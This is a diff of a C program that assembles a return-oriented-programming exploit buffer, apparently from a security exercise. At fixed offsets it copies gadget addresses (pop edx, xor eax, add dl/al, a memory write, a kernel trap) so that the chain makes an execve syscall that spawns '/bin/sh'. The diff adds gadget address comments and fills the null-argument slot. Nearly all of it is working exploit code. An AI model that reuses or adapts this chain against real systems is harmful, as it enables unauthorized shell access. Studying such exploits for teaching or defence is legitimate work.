@@ -34,7 +34,7 @@ int main(void)
   strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 135, exec_arg);
   // clear eax
-  strcpy(bufr + 139, xor_eax); 
+  strcpy(bufr + 139, xor_eax); // 0xbba9b3c2
   // add last 8 bits of edx to eax
   strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
                                  // eax now holds 0x3b (59)
@@ -47,13 +47,14 @@ int main(void)
   strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
                                              // null arg should be present
   // trap into kernel
-  strcpy(bufr + 163, trap);
+  strcpy(bufr + 163, trap); // 0xbba9b6e5
   // leave 4 bytes for the ret call of trap
   // address of "/bin/sh"
   strcpy(bufr + 171, shell_addr);
   // address of prev arg
   strcpy(bufr + 175, prev_addr);
   // leave 4 bytes for null arg at bufr + 179
+  strcpy(bufr + 179, "\x01\x01\x01\x01");
   // location of "/bin/sh" bufr + 183
   strcpy(bufr + 183, "/bin/sh");
 
